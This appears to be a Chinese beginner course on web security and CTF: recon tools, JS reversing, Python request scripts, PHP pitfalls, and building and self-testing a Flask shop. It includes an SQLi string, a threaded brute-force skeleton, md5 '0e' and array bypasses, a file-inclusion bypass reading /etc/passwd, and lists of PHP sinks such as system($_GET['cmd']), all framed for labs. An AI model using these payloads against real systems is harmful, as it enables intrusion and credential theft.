> 💡 一个能救命的习惯：**每次只改一个东西再发**。同时改三个参数，响应变了你也不知道是哪个起了作用——这是新手最常见的浪费时间方式。

## Yakit、curl 与 CyberChef：更轻的三个工具

*约 25 分钟*

> 🎯 **本节目标**：知道每个工具的定位，能按场景选对工具——而不是只会一个。

**定位对照**

| 工具 | 定位 | 最常用的场景 | 替代关系 |
| --- | --- | --- | --- |
| Yakit | 国产免费的 Burp 替代 | 图形化抓包、重放、插件式扫描 | 新手友好的 Burp 替代 |
| curl | 命令行 HTTP 客户端 | 精确复现、脚本化、复制即用 | 和浏览器 Network 互通（Copy as cURL） |
| CyberChef | 编解码瑞士军刀 | 多层 Base64 / 换编码 / 哈希识别 | 浏览器里就能用 |
| DevTools | 浏览器自带 | 看 DOM、看请求、跑 JS | 一切的第一步 |

**curl 必会参数**

```bash
curl -i   URL      # 带上响应头
curl -I   URL      # 只要响应头
curl -X POST -d "a=1&b=2" URL
curl -H "Cookie: session=xxx" URL
curl -b "session=xxx" URL           # 等价写法
curl -k   URL      # 忽略证书错误
curl -L   URL      # 跟随重定向
curl -x http://127.0.0.1:8080 URL   # 走 Burp 代理
curl -o out.html URL                # 存文件
```

CyberChef 的典型用法：拿到一串 `ZmxhZ3t3M2J9` 这样的字符，丢进去试 Base64 解码；如果是套娃，用 **Magic** 自动猜。CTF 的编码题基本都在这里解决。

> 💡 工具不在多。一个抓包工具 + curl + 一个编解码工具，就足够打到中级题。真正决定你水平的是「看懂响应差异」的能力，不是工具数量。

## 信息收集：把题目面积缩小

*约 35 分钟*

> 🎯 **本节目标**：掌握目录扫描、指纹识别、备份文件探测、源码泄露还原的基本流程。

信息收集不是「扫得越多越好」，而是**用最少的请求找到最有价值的东西**：源码、备份、隐藏路径、版本号。

**四类收集动作**

| 类型 | 动作 | 常用工具 |
| --- | --- | --- |
| 指纹识别 | 看响应头、报错页、Cookie 名、静态资源路径 | curl -I、whatweb、Wappalyzer |
| 目录与文件 | 常见路径、备份文件、编辑器临时文件 | dirsearch、ffuf、自定义字典 |
| 源码泄露 | .git / .svn / .bak / .zip / source map | GitHack、git-dumper |
| 子域与端口 | 子域名枚举、常见端口探测 | oneforall、nmap（仅授权目标） |

**常用动作（按性价比排序）**

```bash
curl -I http://target                 # 1. 响应头指纹
curl http://target/robots.txt         # 2. 隐藏路径
curl http://target/.git/config        # 3. 源码泄露（200 = 存在）
curl -s http://target/index.php.bak -o a.bak -w "%{http_code}\n"

# 目录扫描（字典决定效果；比赛先用小字典跑一遍）
python dirsearch.py -u http://target -e php,zip,bak,txt,swp

# 指纹识别
whatweb http://target
```

### 处理顺序（先做最划算的）

1. 先看题面有没有给源码/附件——给了就先读，不要在没读源码的情况下去扫目录。
2. 再做响应头 + 首页源码（Ctrl+F 搜 flag / api / key）——成本最低。
3. 接着试 robots.txt、常见备份名、.git/config——四个请求见分晓。
4. 以上都没有，才上目录扫描——这时你要的是一份「更大的地图」。
5. 扫到东西后立即停下来读，不要为了「扫完」继续消耗时间。

> 💡 在真实环境里做目录扫描必须**有书面授权**，并且控制并发；扫描可能触发告警、影响业务。课程里的练习一律在靶场或本地容器里做。

## Docker 搭本地靶场

| 靶场 | 起法 | 端口 |

## 外部手册怎么用：HackTricks 与 seccmd 攻击手册

*约 30 分钟*

> 🎯 **本节目标**：把两个社区常用的手册变成自己的「字典」：卡住时知道查哪个词、查完怎么验证。

这门课给你的是「体系和最小复现」；但每种漏洞的变体、冷门绕过、特定框架的 payload，多到没人能背完。**正确的做法是：会查，而不是会背。**下面两个站点，一个英文百科、一个中文速查，正好互补。

### 查手册的纪律（重要）

1. 先自己做 15 分钟：判断漏洞类型、试 2 个 payload——没有自己的尝试，查了也记不住。
2. 卡住后再查：只看「下一步该怎么做」，不要整篇读完。
3. 回到题目验证：手册里的 payload 90% 要按目标环境改（引号、闭合符、路径）。
4. 验证成功后，把「为什么这样改」写进自己的速查表——这才是你的东西。

## JS 进阶：fetch、JSON、异步

*约 40 分钟*

> 🎯 **本节目标**：能独立写一段「发请求 → 判结果 → 处理数据 → 显示」的 JS 代码，并看懂别人的实现。

PART 1 学了语法，这节学「怎么真的跟服务器交互」。所有前端逻辑的核心就是这三个动作：**发请求、解析响应、处理异常**。

**async / await 标准写法**

```js
async function loadUser(id) {
  const res = await fetch("/api/user?id=" + id);
  if (!res.ok) throw new Error("HTTP " + res.status);   // 4xx/5xx 不会自动抛错
  const data = await res.json();                        // 解析 JSON 响应体
  console.log(data.name);
  return data;
}

// 调用：用 then/catch 或外层再写 await
loadUser(1).then(u => console.log(u)).catch(e => console.error(e));
```

**fetch 响应对象上常用的字段**

| 成员 | 含义 | 什么时候用 |
| --- | --- | --- |
| res.ok | 状态码 200–299 时为 true | 判断请求是否成功（比 status 直观） |
| res.status | 数字状态码 | 要区分 401 / 403 / 404 时 |
| res.headers.get(x) | 读响应头 | 看 Set-Cookie、Content-Type |
| res.text() | 响应体当文本 | HTML / 纯文本接口 |
| res.json() | 响应体当 JSON 解析 | 接口返回 JSON 时 |
| res.blob() | 响应体当二进制 | 下载文件 |

注意一个坑：**res.text()、res.json() 都只能调用一次**——响应体是流，读一次就消费掉了。要复用就先存起来：`const txt = await res.text()`。

**POST 提交 JSON（最常用）**

```js
const res = await fetch("/api/login", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ user: "admin", pw: "123" }),
});
console.log(res.status, await res.text());
```

**控制台里直接试（最有用的调试方式）**

```js
// 控制台支持顶层 await，不用包 async 函数
const r = await fetch("/api/user?id=1");
console.log(r.status);
const j = await r.json();
console.log(j);

// 想带 Cookie？同源默认带；跨域要 credentials: "include"
await fetch("https://other.site/api", { credentials: "include" });
```

### 三个最常见的错

- **忘记 await**：拿到的是 `Promise {&lt;pending&gt;}`，不是数据。控制台里直接敲 fetch 就会看到这个。
- **忘了判 res.ok**：404 页面也会被当成成功，然后 json() 解析报错。
- **CORS 被拦**：浏览器里跨域请求会先发预检（OPTIONS），对方没放行就失败——这不是你的代码错，是浏览器在保护用户。

> 💡 CTF 里这个知识点的用处：**看到页面调用了什么接口、传了什么参数，就能自己构造请求重放**。前端代码在浏览器里，永远是可读可改可调用的。

## JS 逆向入门：断点、美化、调试

*约 45 分钟*

> 🎯 **本节目标**：拿到一个陌生 JS 文件，能用断点看出它在什么时候、用什么参数、做了什么，并找到加密/校验函数。

「逆向」听起来高级，本质上只有三件事：**让代码变好看、让程序停下来、看清变量值**。工具全在 F12 里，不用装任何东西。

**Sources 面板的常用操作**

| 操作 | 怎么做 | 作用 |
| --- | --- | --- |
| 格式化压缩代码 | 左下角 { } 按钮（Pretty print） | 把一整行变回缩进可读的代码 |
| 打断点 | 点行号，出现蓝色标记 | 执行到这一行会暂停 |
| 条件断点 | 右键行号 → Add conditional breakpoint | 只有条件成立才停，适合循环里抓特定一次 |
| 单步执行 | F10 跳过 / F11 进入 / F8 继续 | 逐行观察执行路径 |
| 看变量 | 右侧 Scope 面板 / 悬停变量 | 当前作用域里所有变量的值 |
| 在暂停时求值 | 下方 Console 直接输入表达式 | 用当前作用域的变量算东西 |
| XHR 断点 | Sources → XHR/fetch Breakpoints | 自动停在所有网络请求处 |

### 实战流程：找到登录密码的加密函数

1. Network 面板里点一次登录，看请求体：`user=admin&amp;pw=8f3a...`——pw 是密文。
2. 在 Sources 里按 **Ctrl+Shift+F** 全局搜 `/login` 或 `pw`，定位发请求的代码。
3. 在 `fetch`/`XMLHttpRequest` 调用那一行**前面**下一行断点。
4. 点登录按钮，代码暂停。右侧 Scope 里找到 pw 变量；再往上翻调用栈（Call Stack），找到它是用什么函数算出来的。
5. 在 Console 里对那个函数求值：改个输入、看输出，确认算法。
6. 最后：如果算法在本地，你就可以在控制台直接算出任意密码——前端加密在有代码的情况下等于没有加密。

**在暂停状态下能做什么**

```js
// 1. 打印当前所有变量
Object.keys(window);           // 看页面挂了哪些全局对象

// 2. 直接调用可疑函数
window.encrypt("test");        // 如果它是全局的

// 3. 修改值继续执行
localStorage.setItem("isAdmin", "true");

// 4. 找挂到 window 上的出口（题目最常留的口子）
for (const k in window) if (k.startsWith("__")) console.log(k);
```

**常见混淆类型与应对**

| 混淆方式 | 特征 | 应对 |
| --- | --- | --- |
| 压缩（minify） | 一行到底、变量名变短 | 点 { } 格式化 |
| 字符串数组 | 所有字符串集中在一个数组里，用下标取 | 先看数组内容，再看下标对应关系 |
| 十六进制/Unicode 转义 | \x41\u4f60 这类 | 复制到控制台 eval 一下看结果 |
| 控制流平坦化 | 一堆 while + switch 分发 | 找状态机入口，或直接下断点跑 |
| 反调试 | debugger 死循环、检测 devtools | 用条件断点跳过，或右键 Never pause here |

> 💡 逆向的终点不是「看懂每一行」，而是**找到那个关键词**：加密函数在哪、密钥是什么、校验逻辑能不能绕过。读不懂就调用它——这是本课反复强调的思维。

## Python requests：把手工测试写成脚本

*约 45 分钟*

> 🎯 **本节目标**：用 requests 复现你在 Burp 里做过的一次请求，保持会话，并处理超时、重定向、代理。

requests 是 Web 安全脚本的核心库。会用它，等同于「会写自动化」。这一节把它最常用的参数一次性讲透——做题时 90% 的脚本用到的就是这些。

**requests 参数速查**

| 参数 | 作用 | 典型场景 |
| --- | --- | --- |
| params={...} | 拼到 URL 的查询串 | GET 请求、SQLi 的 ?id= |
| data={...} | 表单体（x-www-form-urlencoded） | 登录、POST 表单 |
| json={...} | JSON 请求体 + 自动设 Content-Type | API 接口 |
| files={...} | 文件上传（multipart） | 上传漏洞 |
| headers={...} | 自定义请求头 | 改 Referer / XFF / UA 绕过 |
| cookies={...} | 直接塞 Cookie | 已有 session 时最快 |
| timeout=10 | 超时秒数（强烈建议必写） | 防止脚本卡死 |
| allow_redirects=False | 不自动跟随 302 | 看跳转逻辑、SSRF、CSRF |
| proxies={...} | 走 Burp 代理 | 抓包观察脚本发了什么 |
| verify=False | 忽略证书错误 | 自签名 HTTPS 靶场 |

**完整示例：登录 → 访问需要登录的页面**

```python
import requests

BASE = "http://127.0.0.1:8000"
s = requests.Session()                  # 会话：自动保存并携带 Cookie

# 1. 登录
r = s.post(BASE + "/login", data={"user": "admin", "pw": "admin"}, timeout=10)
print("登录状态:", r.status_code, "长度:", len(r.text))

# 2. 访问只有登录后才能看的页面
r = s.get(BASE + "/profile", timeout=10)
print(r.status_code, r.text[:200])

# 3. 看会话里到底有什么 Cookie
print(s.cookies.get_dict())
```

**处理重定向、超时与代理**

```python
import requests

# 不跟随重定向：手动看每一步去哪里
r = requests.get("http://target/redirect", allow_redirects=False, timeout=10)
print(r.status_code, r.headers.get("Location"))

# 走 Burp 代理，观察脚本的请求
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.get("http://target/", proxies=proxies, verify=False, timeout=10)

# 统一异常处理：脚本跑批量时千万别让一个超时打断全部
try:
    r = requests.get("http://target/", timeout=5)
    r.raise_for_status()                 # 4xx/5xx 抛异常
except requests.RequestException as e:
    print("请求失败:", e)
```

> 💡 从浏览器迁移到脚本的最快路径：Network 面板 → 右键请求 → **Copy as cURL** → 粘贴到 curlconverter.com → 直接得到 requests 代码。先让它能跑，再理解每一行。

### 常见坑

- **忘了 timeout**：目标挂掉时脚本会无限等，一晚上白跑。
- **用 requests.get 却没处理 session**：登录后的请求带不上 Cookie，全都跳登录页。
- **verify=False 的警告**：不影响功能，想消掉用 `urllib3.disable_warnings()`。
- **编码乱码**：`r.encoding = r.apparent_encoding`，或直接 `r.content` 自己解码。

## Python 处理编码与批量验证

*约 45 分钟*

> 🎯 **本节目标**：能写一个带编码处理、并发、重试、结果记录的小工具——这是盲注和爆破的通用骨架。

这一类脚本永远由四部分组成：**载荷生成 → 发请求 → 判断结果 → 记录**。把这四块写熟，盲注、爆破、目录扫描都是同一个骨架。

**编码三件套（必须背下来）**

| 需求 | 代码 | 结果 |
| --- | --- | --- |
| Base64 编码 | base64.b64encode(b"hello") | b'aGVsbG8=' |
| Base64 解码 | base64.b64decode("aGVsbG8=") | b'hello' |
| URL 编码 | urllib.parse.quote("a b&c") | 'a%20b%26c' |
| URL 解码 | urllib.parse.unquote("%e4%bd%a0") | '你' |
| MD5 | hashlib.md5(b"123456").hexdigest() | 32 位十六进制 |
| 十六进制 | binascii.hexlify(b"AB") | b'4142' |
| 十六进制还原 | binascii.unhexlify("4142") | b'AB' |

**编码实验：确认你的直觉**

```python
import base64, urllib.parse, hashlib

s = "flag{w3b}"
b = base64.b64encode(s.encode())          # 注意：先 encode 成 bytes
print(b.decode())                         # ZmxhZ3t3M2J9

print(urllib.parse.quote("a=1&b=2"))      # a%3D1%26b%3D2
print(hashlib.md5(b"123456").hexdigest()) # e10adc3949ba59abbe56e057f20f883e
```

**通用爆破骨架（带重试与结果记录）**

```python
import requests, time
from concurrent.futures import ThreadPoolExecutor

TARGET = "http://target/api/check"
HITS = []

def attempt(item):
    for _ in range(3):                    # 失败重试 3 次
        try:
            r = requests.post(TARGET, data={"key": item}, timeout=5)
            if r.status_code == 302 or "success" in r.text:
                HITS.append(item)
                print("[+] 命中:", item)
            return
        except requests.RequestException:
            time.sleep(0.5)

if __name__ == "__main__":
    with open("wordlist.txt", encoding="utf-8") as f:
        items = [x.strip() for x in f if x.strip()]
    with ThreadPoolExecutor(max_workers=10) as ex:   # 并发别开太大
        ex.map(attempt, items)
    with open("hits.txt", "w", encoding="utf-8") as f:  # 结果一定要落盘
        f.write("\n".join(HITS))
    print("完成，命中", len(HITS), "个")
```

**怎么判断「命中」**

| 信号 | 说明 | 可靠性 |
| --- | --- | --- |
| 状态码变化 | 200 → 302，或 404 → 200 | 高 |
| 响应长度变化 | len(r.text) 差几十字节以上 | 高 |
| 关键词出现 | "success" / "flag" / "admin" | 中（可能被转义） |
| 响应时间变化 | sleep 型盲注靠这个 | 中（网络抖动大） |
| 重定向目标 | Location 头指向哪里 | 高 |

> 💡 这类脚本只用于**自己拥有或明确授权**的目标（公开靶场、比赛环境、本地容器）。对真实业务系统做批量请求既违规也容易打挂对方——这是安全学习中**最容易越界**的一类操作。

## PHP 基础语法与超全局变量

*约 45 分钟*

> 🎯 **本节目标**：读懂一段 PHP 源码，指出用户输入从哪进来、进了哪个函数。

PHP 是 CTF Web 出现频率最高的后端语言。语法松散、上手快，但正是这些「松散」制造了大部分考点。

**基础语法：和 JS 的对照**

```php
<?php
$name = "wei";                 // 变量以 $ 开头，不用声明类型
$arr  = [1, 2, 3];             // 数组（索引）
$map  = ["a" => 1, "b" => 2];  // 关联数组（像 JS 对象）
$num  = 42;
$str  = "值为 $num";           // 双引号里变量会展开
$raw  = '值为 $num';           // 单引号里不会

function add($x, $y) { return $x + $y; }
foreach ($map as $k => $v) { echo "$k = $v"; }
if ($name === "wei") { echo "yes"; }
?>
```

**超全局变量 —— 用户输入的六个入口**

| 变量 | 来源 | 危险点 |
| --- | --- | --- |
| $_GET | URL 查询串 ?a=1 | 最常见注入点 |
| $_POST | 请求体（表单/JSON 解析后） | 登录、提交类接口 |
| $_COOKIE | Cookie 头 | 常被忽略，却能控制会话/序列化数据 |
| $_FILES | 上传文件 | 文件名、临时路径都可控 |
| $_SERVER | 请求头与路径（如 HTTP_USER_AGENT） | 改 UA / Host 就能注入 |
| $_REQUEST | GET + POST + COOKIE 的合集 | 来源不明确，最危险 |

**危险函数：看到就要警觉**

```php
<?php
// —— 文件类 ——
include($_GET["page"]);           // 文件包含：可能执行任意 PHP
require($_POST["f"]);
file_get_contents($_GET["f"]);      // 任意文件读取
readfile($_GET["f"]);
file_put_contents($_GET["p"], $_POST["d"]);   // 任意文件写入

// —— 执行类 ——
eval($_POST["code"]);          // 代码执行（最危险）
assert($_POST["code"]);
system($_GET["cmd"]);            // 命令执行
exec(), shell_exec(), passthru(), popen(), `cmd`
create_function(), preg_replace("/e")

// —— 序列化 ——
unserialize($_COOKIE["data"]);        // 反序列化：魔术方法触发
?>
```

**一个漏洞从产生到修复**

```php
<?php
// 危险：直接拼接
$name = $_GET['name'];
echo "hello, " . $name;                     // XSS：原样输出
$sql  = "SELECT * FROM u WHERE n='$name'";  // SQLi：拼进 SQL

// 修复
echo "hello, " . htmlspecialchars($name, ENT_QUOTES, 'UTF-8');
$stmt = $pdo->prepare("SELECT * FROM u WHERE n = ?");
$stmt->execute([$name]);
?>
```

> 💡 读 PHP 源码的固定路线：**找入口**（$_GET/$_POST/$_COOKIE）→ **跟变量** → **找它最后进到哪个函数**。这条路线上如果没有过滤，就是漏洞。

## PHP 弱类型与经典陷阱

*约 45 分钟*

> 🎯 **本节目标**：掌握松散比较、MD5 0e 缺陷、数组绕过、strcmp/switch 陷阱这四类高频考点。

PHP 是弱类型语言，比较时会隐式转换类型。CTF 里最经典的一整类题就是围绕这个特性出的。

**== 与 === 的差别（背这张表）**

| 表达式 | == 结果 | === 结果 | 原因 |
| --- | --- | --- | --- |
| "1" 和 1 | true | false | == 会转数字，=== 要求类型也相同 |
| "1" 和 "1.0" | true | false | 两个字符串都转成数字 1 |
| "0e123" 和 "0e456" | true | false | 都解析成 0 的科学计数法 |
| null 和 false | true | false | 松散比较认为空等价 |
| "abc" 和 0（PHP 7） | true | false | 非数字字符串转成 0；PHP 8 已修正 |
| [] 和 false | true | false | 数组与布尔转换 |

**MD5 0e 缺陷（经典题）**

```php
<?php
// 题目：要求 md5($a) == md5($b) 但 $a != $b
// 思路：找两个字符串，它们的 md5 都是 0e 开头（被当成 0 比较）
$a = "QNKCDZO";              // 0e830400451993494058024219903391
$b = "240610708";            // 0e462097431906509019562988736854
// 更多：aaroZmOk、aaK1STfY、aaO8zKZF、byGcY

if ($a != $b && md5($a) == md5($b)) {
    echo "flag{...}";
}
?>
```

**数组绕过（更常见，也更通用）**

```php
<?php
// 题目：md5($_GET['a']) === md5($_GET['b'])
// 请求：?a[]=1&b[]=2
// md5() 收到数组返回 null，null === null 成立
// 同类：sha1()、md5_file()、strcmp() 传数组都会返回 null

// strcmp 题：?password[]=x
// PHP 8 起数组绕过部分被修正，但 == 比较与 json_decode 场景仍可复用
?>
```

**其他高频陷阱**

```php
<?php
// 1) in_array 松散比较
in_array("1abc", [1, 2, 3]);     // true（松散）-> 用 in_array($x, $arr, true)

// 2) switch 松散比较
switch ("1abc") { case 1: echo "命中"; }   // 命中

// 3) intval 的截断
intval("1e3") == 1;              // 1（不是 1000）
intval("0x1a") == 0;             // 十进制解析

// 4) 字符串自增
$s = "a"; $s++;                  // "b" —— 常被用来绕字符过滤

// 5) 变量覆盖
extract($_GET);                  // 用户能覆盖任意变量！?is_admin=1
?>
```

**PHP 8 的变化**：字符串与数字比较的语义被修正（`"abc" == 0` 变 false），但 md5/sha1 对数组返回 null、0e 比较、`in_array` 不加 strict、`extract` 覆盖这些坑依旧存在，仍然是考点。

> 💡 这一节的知识在真实开发里同样致命：PHP 项目里任何一处 `==` 比较用户输入，都可能被 0e 或类型转换绕过。修复原则：**比较敏感值一律用 ===，数字先 intval，哈希用 hash_equals**。

## 读 PHP 源码的固定套路

*约 45 分钟*

> 🎯 **本节目标**：拿到一个 PHP 文件，10 分钟内定位可能的漏洞点，并写出对应的验证 payload。

这节是手法训练。千变万化的代码，用固定四步就能扫出可疑点——这也是真实代码审计的最小流程。

**四步法**

| 步骤 | 搜什么 | 产出 |
| --- | --- | --- |
| ① 找入口 | $_GET / $_POST / $_COOKIE / $_REQUEST / $_FILES / $_SERVER | 所有可控变量清单 |
| ② 跟变量 | 变量被赋给了谁、传给了谁 | 数据流图（脑内画） |
| ③ 找落点 | 危险函数清单（包含/执行/文件/序列化/SQL） | 可疑调用点 |
| ④ 查判断 | if / === / in_array / preg_match / strpos | 能不能绕过校验 |

**一个典型例子（逐步拆）**

```php
<?php
$file = $_GET['f'];                     // ① 入口：完全可控
if (strpos($file, '..') === false) {    // ④ 判断：只挡了 ..
    include('./pages/' . $file . '.php');   // ③ 落点：文件包含
}
?>
<!-- 绕过：绝对路径 /etc/passwd 不需要 ..；或者 php://filter 读源码 -->
```

**危险函数速查（按危害排序）**

| 类别 | 函数 | 能做什么 |
| --- | --- | --- |
| 代码执行 | eval / assert / create_function / preg_replace(/e) | 执行任意 PHP 代码 |
| 命令执行 | system / exec / shell_exec / passthru / popen / 反引号 | 执行系统命令 |
| 文件包含 | include / require / include_once | 包含并执行任意文件 |
| 文件读写 | file_get_contents / readfile / file_put_contents / unlink / rename | 读写删任意文件 |
| SQL | mysql_query / mysqli_query 拼接 | SQL 注入 |
| 反序列化 | unserialize | 触发魔术方法链 |
| 变量覆盖 | extract / parse_str / $$var | 覆盖任意变量 |
| SSRF/请求 | curl_exec / file_get_contents($url) | 让服务器发请求 |

### 实战练习清单

1. 拿一个开源 PHP 项目（如一个简单博客），全局搜 `$_GET`。
2. 对每一处，往下跟 3 行，看变量进了哪个函数。
3. 对进到危险函数的，问三件事：能不能控制输入？有没有过滤？过滤能不能绕？
4. 把怀疑点写成一条 payload，用本地 PHP 内置服务器验证。
5. 验证成功后再去读修复方式——这样你会记住「为什么这样修」。

> 💡 记不住函数没关系，记住这条链：**入口 → 变量 → 落点 → 判断**。任何一个环节漏了，就是漏洞。

## 为什么要自己写一个站

> 🎯 **本节目标**：理解「开发视角」和「攻击视角」是同一件事的两面，并知道自己要写一个什么样的站。

学长给的建议里有一条特别关键：**学语言的时候顺手写一个正经 Web 应用**。因为漏洞从来不是凭空出现的，它是开发过程中的某个决定——图省事、少校验、信任前端——带来的副作用。写过一遍，你才知道那些决定发生在哪里。

**开发时会做的决定 → 后来变成的漏洞**

| 开发时的决定 | 当时的理由 | 后来成了什么 |

| 上传文件不过滤后缀 | 先支持常见格式 | 文件上传 getshell |

## 需求与数据建模：先想清楚再写代码

*约 30 分钟*

> 🎯 **本节目标**：能用三张表描述一个小商城，并说清哪些字段是「敏感字段」。

很多漏洞在写代码之前就埋下了：表设计里没有「归属」字段，后面就很容易写出越权；密码字段图省事存明文，泄露时就是灾难。

**三张表**

| 表 | 字段 | 注意点 |
| --- | --- | --- |
| users | id, username, pass_hash, role, created_at | 密码只存哈希；role 只用于服务端判断 |
| products | id, name, price, stock | price 用整数（分），避免浮点误差 |
| orders | id, user_id, product_id, qty, amount, status, created_at | user_id 必须来自 session；amount 由服务端算 |

**建表语句（SQLite）**

```sql
CREATE TABLE users (
  id        INTEGER PRIMARY KEY AUTOINCREMENT,
  username  TEXT UNIQUE NOT NULL,
  pass_hash TEXT NOT NULL,
  role      TEXT NOT NULL DEFAULT 'user',
  created_at TEXT DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE products (
  id    INTEGER PRIMARY KEY,
  name  TEXT NOT NULL,
  price INTEGER NOT NULL,     -- 单位：分
  stock INTEGER NOT NULL DEFAULT 0
);

CREATE TABLE orders (
  id         INTEGER PRIMARY KEY AUTOINCREMENT,
  user_id    INTEGER NOT NULL,   -- 归属：谁下的单
  product_id INTEGER NOT NULL,
  qty        INTEGER NOT NULL,
  amount     INTEGER NOT NULL,   -- 服务端计算，不接收前端传的金额
  status     TEXT NOT NULL DEFAULT 'created',
  created_at TEXT DEFAULT CURRENT_TIMESTAMP
);
```

**哪些字段不能信**

| 字段 | 为什么 | 正确做法 |
| --- | --- | --- |
| amount | 前端可以改成 1 分钱 | 服务端按 price × qty 重新算 |
| role | 用户可以改 Cookie | 只从数据库读 |
| user_id | 可以改成别人的 id | 从 session 取，不接收 |
| status | 可以跳过支付 | 状态机由服务端推进 |

> 💡 这张表的思想可以迁移到所有系统：**凡是「钱、身份、归属、状态」，都必须由服务端决定。**记住这句话，一半的逻辑漏洞就没了。

## 用 Flask 写登录与页面

*约 45 分钟*

> 🎯 **本节目标**：写出一个能注册、登录、看商品、下单的最小 Flask 应用，并理解 session 在这里的作用。

**app.py（最小可运行）**

```python
from flask import Flask, request, session, redirect, render_template_string
import sqlite3, hashlib, os

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "dev-only-change-me")

def db():
    conn = sqlite3.connect("shop.db")
    conn.row_factory = sqlite3.Row
    return conn

@app.route("/register", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        u = request.form["username"]
        p = request.form["password"]
        h = hashlib.sha256(p.encode()).hexdigest()
        with db() as c:
            c.execute("INSERT INTO users(username, pass_hash) VALUES(?, ?)", (u, h))
        return redirect("/login")
    return render_template_string(REG_FORM)

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        u = request.form["username"]
        h = hashlib.sha256(request.form["password"].encode()).hexdigest()
        row = db().execute("SELECT id, pass_hash FROM users WHERE username = ?", (u,)).fetchone()
        if row and row["pass_hash"] == h:
            session["uid"] = row["id"]          # 身份只放服务端签名过的 session
            return redirect("/")
        return "用户名或密码错误", 401
    return render_template_string(LOGIN_FORM)

@app.route("/")
def index():
    if "uid" not in session:
        return redirect("/login")
    rows = db().execute("SELECT * FROM products").fetchall()
    return render_template_string(INDEX, rows=rows, uid=session["uid"])
```

**这一段里，哪些地方是「安全写法」**

| 写法 | 为什么安全 |
| --- | --- |
| session["uid"] = row["id"] | 身份由服务端签名，用户改不了 |
| SQL 用 ? 占位符 | 参数化查询，杜绝注入 |
| 密码只存 sha256（真实项目用 bcrypt/argon2） | 拖库也拿不到明文 |
| secret_key 从环境变量读 | 不把密钥写进代码/仓库 |

> 💡 这个站还故意留了几处「不安全的写法」——比如金额从表单读、错误信息原样返回——就是为了让你在第 5 节用 Burp 亲手打自己。带着「我知道这里会出问题」的心态写代码，是理解漏洞最快的路。

## 数据层：SQLite、参数化与事务

*约 35 分钟*

> 🎯 **本节目标**：会用参数化查询与事务写业务逻辑，并能说出「拼接 SQL」到底错在哪。

**正确 vs 错误**

```python
# ❌ 错误：拼接字符串
sql = f"SELECT * FROM users WHERE username = '{u}'"
c.execute(sql)          # 传入 ' OR '1'='1 就直接绕过

# ✅ 正确：参数化
c.execute("SELECT * FROM users WHERE username = ?", (u,))

# ✅ 正确：多条语句用事务，保证「扣库存 + 建订单」同时成功或同时失败
with db() as c:
    c.execute("UPDATE products SET stock = stock - ? WHERE id = ? AND stock >= ?", (qty, pid, qty))
    if c.total_changes == 0:
        raise ValueError("库存不足")
    c.execute("INSERT INTO orders(user_id, product_id, qty, amount) VALUES(?,?,?,?)",
              (session["uid"], pid, qty, amount))
```

**数据层的三件事**

| 事项 | 做法 | 防住了什么 |
| --- | --- | --- |
| 参数化 | 永远用 ? 占位符 | SQL 注入 |
| 事务 | 扣库存与建订单放同一事务 | 并发下超卖/半成功 |
| 服务端计算 | 金额、库存、状态都在服务端算 | 价格篡改、状态跳过 |

**一个容易忽略的越权写法**

```python
# ❌ 从请求里取 user_id：用户传别人的 id 就能看别人订单
uid = request.args.get("uid")
orders = db().execute("SELECT * FROM orders WHERE user_id = ?", (uid,)).fetchall()

# ✅ 从 session 取：只可能看到自己的
orders = db().execute("SELECT * FROM orders WHERE user_id = ?", (session["uid"],)).fetchall()
```

> 💡 参数化解决「代码注入」，事务解决「并发与一致性」，服务端计算解决「信任前端」。这三条写完，你的小站就比很多线上项目安全了。

## 上线前的安全检查清单，以及用 Burp 打自己的站

| 依赖没有已知漏洞 | pip list → 对照 CVE | 组件漏洞 |

1. 本地跑起来：`flask --app app run --debug`，用浏览器把四个页面都走一遍。
2. 打开 Burp，浏览器代理到 127.0.0.1:8080，勾上 Intercept。
3. **打自己的站 1**：登录请求里把密码改成 `' OR '1'='1`，看你写的是不是参数化（应当失败）。
4. **打自己的站 2**：下单时把 amount 改成 1，看服务端是否重新计算（应当忽略）。
5. **打自己的站 3**：把 URL 里的订单 id 改成别人的，看是否越权（应当 403）。
6. 发现能打通的地方，回到代码里修掉，再打一次——这一步比看十篇 WriteUp 有用。

> 💡 这份清单就是「正经 Web 应用开发会考虑什么」的答案：**输入校验、身份与权限、数据一致性、错误处理、依赖管理、部署配置**。它同样是你以后审计别人代码的检查表。

- **Java / Node 最后**：它们的漏洞形态（反序列化链、原型链污染）需要前面全部基础，提前学只会背 payload。

> 💡 顺序是「认知依赖」，不是「学习难度排名」。你可以并行学 Python（它是工具），但 PHP 特性必须在学 PHP 框架之前——否则你只是记住了框架漏洞的名字。

## PHP 框架：ThinkPHP 与它的考点

*约 45 分钟*

> 🎯 **本节目标**：看懂 ThinkPHP 站点的目录结构、路由规则与常见漏洞位置，并能判断版本。

ThinkPHP 是国内中小项目用得极多的 PHP 框架，也是国内 CTF 的常客。框架题的难度不在「挖洞」，而在「认出这是哪个框架、哪个版本」。

**典型目录结构**

| 路径 | 作用 | 能泄露什么 |
| --- | --- | --- |
| public/index.php | 唯一入口文件 | 入口写法暴露版本 |
| app/controller/ | 控制器：处理请求 | 业务逻辑、SQL 拼接、参数使用 |
| app/model/ | 数据模型 | 表结构、字段名 |
| app/view/ | 模板 | 渲染方式（是否可注入） |
| config/ | 配置 | 数据库账号、密钥（若可读） |
| runtime/ | 运行时缓存与日志 | 日志泄露、缓存文件 |
| vendor/ | Composer 依赖 | 框架版本、第三方库版本 |
| composer.json | 依赖清单 | 精确版本号 |

**路由长什么样**

| 写法 | 含义 | 考点 |
| --- | --- | --- |
| /index.php/index/index/index | 模块/控制器/方法 | 默认路由，可猜 |
| /index.php/index/hello?name=wei | 控制器 hello 方法 | 参数直接映射到方法参数 |
| /index.php?s=/index/index | 兼容模式（s 参数） | 参数覆盖风险 |
| /index.php/index/index/index/name/wei | 路径式传参 | 多版本写法差异 |

**控制器里常见的危险写法**

```php
<?php
namespace appindexcontroller;

class Index {
    public function index($name = '') {
        // 危险 1：直接把参数拼进 SQL
        $sql = "select * from user where name = '$name'";
        Db::query($sql);

        // 危险 2：参数被当成模板源码渲染（SSTI）
        return $this->fetch($name);

        // 危险 3：参数进了 file_get_contents（SSRF / 文件读取）
        return file_get_contents(input('url'));
    }
}
?>
```

